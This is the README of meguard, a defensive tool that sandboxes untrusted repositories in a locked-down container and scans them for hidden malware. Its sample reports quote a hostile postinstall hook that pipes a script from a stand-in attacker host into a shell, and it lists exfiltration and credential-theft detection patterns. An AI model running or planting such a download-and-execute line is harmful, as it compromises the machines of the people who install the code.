# meguard

Safely execute untrusted repositories inside a locked-down container sandbox,
and statically scan them for signs of hidden malicious code.

meguard is a fast, lightweight Go CLI for running repos you do not trust, for
example fake-interview repos that hide infostealer or RAT payloads in
`postinstall` hooks or obfuscated blobs. It clones or copies the repo into a
hardened container and runs the install command there. Repo code never touches
your host.

meguard is a container AND a detector: `meguard run` combines the sandbox with
a static scan of the repo's files (advisory by default), and `meguard scan`
runs that same detection alone, with no container and no Docker dependency at
all. See [Static scan](#static-scan-meguard-scan) below.

## Safety model

The five invariants meguard is built to guarantee:

1. Repo code NEVER runs on the host. meguard does `git clone` only (cloning does
   not run install hooks); all execution happens inside the container.
2. NO host bind mounts of the repo or `$HOME`. The repo is copied INTO a
   container tmpfs (streamed in as a tar through `docker exec`, because Docker
   refuses `docker cp` into a read-only container). The container has no route to
   host secrets.
3. Sandbox defaults are locked down; configuration only ever RELAXES. The
   zero-value sandbox Profile is the safest one. A forgotten field cannot open a
   hole.
4. Network egress is always denied. By default meguard runs INSPECTED (egress
   dropped **and** logged, so you see what a repo tried to reach); `--strict`
   drops to `--network none` (no stack at all). Neither mode permits egress.
5. The container is force-removed (`docker rm -f`) on success, install failure,
   panic, or Ctrl-C.

Under the hood, each `run` create these hardening controls on the container:
non-root user, all capabilities dropped, `no-new-privileges`, read-only root
filesystem, tmpfs-only writable paths, a PID cap, memory and CPU ceilings, and
no network.

## Install

meguard needs a Docker-COMPATIBLE runtime on PATH. You do NOT need Docker
Desktop. Any of these work with no configuration change:

- Docker Engine / Docker Desktop
- OrbStack (macOS, lightweight) - recommended for lightness
- Colima (macOS/Linux, lightweight) - recommended for lightness
- Podman (daemonless, rootless) - recommended for security

Install with Go (works today):

    go install github.com/IsraelGboluwaga/meguard@latest

Or build from source. meguard ships two build variants, same binary name and
commands (see [Static scan](#static-scan-meguard-scan) for what differs
between them):

    # Pure static (zero-dependency; run binary is cgo-free)
    CGO_ENABLED=0 go build -o meguard .

    # Full cgo variant
    CGO_ENABLED=1 go build -tags cgo -o meguard .

Homebrew (available once the first release is tagged; see docs/launch.md):

    brew install IsraelGboluwaga/tap/meguard

Check the version:

    meguard --version

See [docs/launch.md](docs/launch.md) for the release pipeline, both build
variants, and verification.

## Usage

    meguard run <repo-url-or-path> [--image IMAGE] [--cmd "INSTALL CMD"] [--runtime CLI] [--strict] [--no-scan] [--fail-on-scan] [-v|--verbose]
    meguard scan <repo-url-or-path> [-v|--verbose]

`run` and `scan` both accept a git URL (cloned to a temp dir that is always
cleaned up) or a local path (copied, never bind mounted).

Before creating the sandbox, `run` also statically scans the repo on the host
(manifest inspection, entropy/long-line detection, and pattern matching for
obfuscation and exfiltration signals) and folds the findings into its report
(the compact "Top findings" block by default, or the full STATIC SCAN section
under `-v`/`--verbose`; see below). Findings are advisory by default: the
sandboxed run proceeds regardless of what scan found, because containment,
not scan, is the safety net. Pass `--no-scan` to skip scanning entirely (the
pre-scan behavior), or `--fail-on-scan` to make `run` exit non-zero after the
run completes if scan reported any High or Critical finding. See
[Static scan](#static-scan-meguard-scan) below for what scan looks for and for
`meguard scan`, which runs the same detection alone with no Docker dependency.

Examples:

    # Node repo (package.json): auto-detected, runs `npm install` in node:20-slim
    meguard run https://github.com/some/suspicious-repo.git

    # A local path
    meguard run ./downloaded-take-home

    # A Python repo (requirements.txt / pyproject.toml): auto-detected, runs pip
    # install in python:3.12-slim - no flags needed
    meguard run ./py-repo

    # Override detection explicitly when you want a specific image or command
    meguard run ./py-repo --image python:3.12-slim --cmd "pip install -r requirements.txt"

    # Rootless runtime (recommended for genuinely hostile code)
    meguard run ./suspicious-repo --runtime podman

    # Default already logs what the repo TRIED to reach (every attempt blocked):
    meguard run ./suspicious-repo

    # Strictest containment: no network stack at all, no egress logs
    meguard run ./suspicious-repo --strict

    # Full detail: protections rationale, every finding, and the raw install log
    meguard run ./suspicious-repo -v

By default `run` prints a COMPACT report: a one-line header, a per-stage
status checklist (`sandbox`, `install`, `scan`, `egress`, `secrets`, using
✓/!/✗ glyphs), a "Top findings" block listing every High/Critical scan
finding individually (capped at 8, with everything else rolled into one
"... N more" line), and a single free-text `RESULT: ...` sentence. The raw
install log is captured but not printed unless the install exited non-zero.
For example, against a repo with a malicious `postinstall` hook:

    meguard run <repo>

    ✓ sandbox    node:20-slim, network denied (--strict, no logs), ephemeral
    ✓ install    npm install (exit 0)
    ! scan       8 finding(s) (2 high, 6 medium) across 8 files
    ✓ egress     denied (--network none, no logs)
    ✓ secrets    0 exposed (by construction: no host mounts, scratch HOME)

    Top findings:
      HIGH     package.json                             package.json "postinstall" lifecycle script matches download piped directly into a shell interpreter: curl -sSL https://evil.example/i.sh | sh
      HIGH     package.json:1                           matches download piped directly into a shell interpreter
      ... 6 more (5 entropy, 1 regex, mostly src/components/ui/*). see `meguard run -v`

    RESULT: clean install, 0 secrets exposed, no egress reached the network. Review the 2 high/critical finding(s) above before trusting this repo.

Pass `-v`/`--verbose` to restore the full report: the `meguard: preparing
locked-down sandbox` header with the active-protections rationale, every scan
finding listed individually with its snippet, and the streamed sandbox output.
Nothing about detection or containment differs between the two modes; this is
presentation only. Exit codes, `--fail-on-scan`, and `--no-scan` behave
identically either way.

### Ecosystem auto-detection

Two values are ecosystem-specific: `--image` and `--cmd`. When you leave them
unset, meguard picks them by inspecting the repo's top-level manifest files (it
only reads which files exist; it never runs repo code).

Only **node** and **python** are auto-detected for now. Any other ecosystem
(Go, Rust, Ruby, and so on) is not yet recognized and falls back to the node
defaults, so run it with an explicit `--image` and `--cmd`.

| Detected | Markers (any) | Image | Install command |
| --- | --- | --- | --- |
| node | `package.json`, `package-lock.json`, `npm-shrinkwrap.json`, `yarn.lock`, `pnpm-lock.yaml` | `node:20-slim` | `npm install` |
| python | `requirements.txt` | `python:3.12-slim` | `pip install --user -r requirements.txt` |
| python | `pyproject.toml`, `setup.py`, `setup.cfg`, `Pipfile` | `python:3.12-slim` | `pip install --user .` |

Precedence: node wins over python for a polyglot repo, and `requirements.txt`
wins over a project manifest within python. When nothing matches, meguard falls
back to the locked-down defaults (`node:20-slim` / `npm install`). An explicit
`--image` or `--cmd` always overrides detection for that value; pip uses
`--user` so installs land on the writable HOME tmpfs under the read-only root.

`--memory` and `--cpus` are conservative internal defaults (2g / 2 CPUs) that
will become user-configurable; a large install may need more than 2g.

### Egress logging (default) and `--strict` (experimental default)

By **default**, `meguard run` shows you what a repo tried to reach: a hardened
monitor sidecar seals a network namespace **fail-closed** (the OUTPUT chain
defaults to DROP, for IPv4 and IPv6, so containment does not depend on any one
route or interface name), the sandbox joins that namespace, and every outbound
connection attempt (to any IP:port, so hardcoded C2 addresses are caught too)
plus every DNS lookup is logged via NFLOG and then dropped. Egress is still fully
denied; you just also get to see it:

    egress: 2 outbound attempt(s) BLOCKED (logged and dropped; none reached the network):
      - BLOCKED tcp 185.220.101.5:443
      - BLOCKED dns api.evil-c2.net

A clean run states "0 outbound attempts observed" explicitly - absence is stated,
never silent. The monitor image defaults to `nicolaka/netshoot` and is
overridable with `--monitor-image`; it must provide `ip`, `iptables`, `ip6tables`,
and a `tcpdump` with NFLOG support. The sandbox itself gains no privileges - only
the monitor (which runs no repo code) is granted the two network capabilities it
needs, and `cap-drop ALL` means the sandbox cannot alter the seal.

**`--strict` is the strongest, fully-verified mode:** `--network none`, no
network stack at all, no monitor, no egress logs. Use it for the hardest
containment or in environments where the monitor image / NFLOG is unavailable.

**Egress logging is now the default, and is verified on Docker/OrbStack (a real
Linux kernel).** The live checklist passed: TCP connection attempts to hardcoded
IPs are logged and dropped, connections to a sibling container on the docker
bridge subnet do not leak, DNS lookups are captured by name, IPv6 is sealed,
cleanup leaves nothing behind, and a repo that makes no calls reports "0 outbound
attempts". Rootless runtimes (e.g. Podman) and other kernels are not yet checked.
To keep `meguard run` working everywhere regardless, **if the monitor cannot
start meguard automatically falls back to `--network none`** with a printed
warning - egress stays fully denied, you just lose the logs for that run. Pass
`--strict` to skip the monitor entirely.

### Choosing a runtime (the trust boundary)

The container daemon is the trust boundary: meguard's hardening flags are only
as strong as the runtime that enforces them, and the shared host kernel is the
ceiling. `--runtime` selects any Docker-compatible CLI (default `docker`). For
genuinely hostile code, prefer a rootless runtime such as `--runtime podman` so
that a container escape lands as an unprivileged user rather than as host root.
meguard does not defend against a host-kernel or root-daemon escape; a rootless
runtime is the single biggest reduction in blast radius available today.

## Troubleshooting

If no Docker-compatible runtime is running, `meguard run` fails immediately
(before cloning anything) with:

    meguard: no Docker-compatible runtime is available: ...

followed by the list of runtimes that satisfy the requirement. Start your runtime
and check it with one of `orbstack status`, `colima status`, `podman info`, or
`docker info`, then retry. You do not need Docker Desktop.

## Static scan (`meguard scan`)

    meguard scan <repo-url-or-path>

`scan` resolves the repo the same safe way `run` does (a plain `git clone`;
cloning does not run install hooks, so this is safe on the host) and then runs
meguard's static analyzers against the repo's files, entirely on the host. It
never touches Docker and never executes repo code; it is a heuristic
detector, not a prover: a clean report means nothing matched, not
"definitely safe". For that guarantee, run the repo inside the sandbox with
`meguard run`, which combines this same scan with containment in one command.

Examples:

    # Scan alone, no container, no Docker dependency at all
    meguard scan https://github.com/some/suspicious-repo.git

    # A local path
    meguard scan ./downloaded-take-home

    # meguard run scans first (advisory), then sandboxes the install
    meguard run ./suspicious-repo

    # Skip the scan entirely and go straight to the sandbox (old behavior)
    meguard run ./suspicious-repo --no-scan

    # Gate a CI pipeline: exit non-zero if scan found anything High/Critical,
    # after the sandboxed run has still completed
    meguard run ./suspicious-repo --fail-on-scan

    # Full detail: every finding listed individually with its snippet
    meguard scan ./suspicious-repo -v

By default `scan` prints a compact report: a one-line header, a status line,
and a "Top findings" block (the same shape `run` prints; see
[Usage](#usage) above), for example:

    meguard scan <repo> (no container; read-only)

    ! scan       8 finding(s) (2 high, 6 medium) across 8 files

    Top findings:
      HIGH     package.json                             package.json "postinstall" lifecycle script matches download piped directly into a shell interpreter: curl -sSL https://evil.example/i.sh | sh
      HIGH     package.json:1                           matches download piped directly into a shell interpreter
      ... 6 more (5 entropy, 1 regex, mostly src/components/ui/*). see `meguard scan -v`

Pass `-v`/`--verbose` to list every finding individually with its snippet
under a `STATIC SCAN` section, the previous default behavior.

What scan looks for, via analyzers behind a single `Analyzer` interface:

- **manifest**: `package.json` lifecycle scripts (`preinstall`, `install`,
  `postinstall`, `prepare`, `preprepare`) scanned with the same pattern set as
  source files; Python manifests (`setup.py`, `pyproject.toml`, `setup.cfg`,
  `Pipfile`) are flagged at Info, since arbitrary code can run at install time
  for that ecosystem regardless of content.
- **entropy**: per-line length plus Shannon entropy on lines over 300
  characters, catching an obfuscated payload appended after legitimate code on
  the same physical line, in any text file. Checked-in minified bundles
  (`dist/`, `build/`, `*.min.js`, `*.bundle.js`) are excluded, and so is a
  `.svg` file, but only when it carries no `<script>` tag (SVG `path`/
  `viewBox` coordinate data is legitimately one long line and would otherwise
  false-positive; an SVG with a `<script>` tag is executable rather than
  static graphics, so it loses the exclusion and is scrutinized like any
  other file). Either way the exclusion is entropy-only: SVG can execute
  (inline `<script>`, `onload=`/`onclick=` handlers), so the regex analyzer
  below still scans all `.svg` content at full severity regardless.
- **regex**: cheap first-pass pattern matching for obfuscation (packer
  signatures, `Function`-constructor eval, global-stashed `require`, the
  `_0xNNNN` obfuscator-tool fingerprint), download-and-execute (curl/wget
  piped to a shell, Python shell exec, Windows LOLBins), exfiltration channels
  (Discord webhooks, Telegram bot API, raw-paste hosts), credential/wallet
  file paths, persistence mechanisms, recon/fingerprinting, and bulk
  `process.env` dumps, plus co-occurrence checks for plain-text exfiltration
  (a network call plus a secrets marker in one file, or a network call inside
  a build/lint/tooling config file that has no legitimate reason to make one).

To keep false positives down, severity is capped by whether a file can
actually execute (prose files like `.md`/`.txt` are capped at Info; a string
in documentation is evidence of nothing), a correlation pass escalates two or
more distinct weak-signal categories co-located in one file into a stronger
finding, and dedupe collapses repeats of the same finding in one file into a
single entry with an occurrence count.

`scan` exits non-zero if any High or Critical finding is reported, so it can
gate a CI pipeline on its own; `meguard run --fail-on-scan` does the same gate
while also containing and observing the repo.

meguard ships two build variants, same binary name and commands:

- a full **cgo** build, and
- a zero-dependency **pure static** build (`CGO_ENABLED=0`).

Both variants currently run manifest, entropy, and regex analysis. Neither
variant has a working AST (tree-sitter) analyzer yet: wiring a real
tree-sitter grammar is future work, out of scope for this slice. AST is a
labeled no-op in both builds today ("AST analysis: disabled (...)" in the
STATIC SCAN section) so the absence is stated, never silently presented as
"AST found nothing".

## Contributing

See [CLAUDE.md](CLAUDE.md) for the working contract, coding standards, and the
standing rule that docs and CHANGELOG are updated in the same change as code.

CI (`.github/workflows/ci.yml`) runs `gofmt -l`, `go build`, `go vet`,
`go test ./...`, and a cgo-free check on the pure static build for every push
and pull request against `main`. Releases (`.github/workflows/release.yml`)
run separately, triggered by pushing a `v*` tag.

## More docs

- [docs/documentation.md](docs/documentation.md) - architecture and threat model
- [docs/launch.md](docs/launch.md) - build variants, release, and deploy
- [docs/decisions.md](docs/decisions.md) - decision log
- [CHANGELOG.md](CHANGELOG.md) - changes
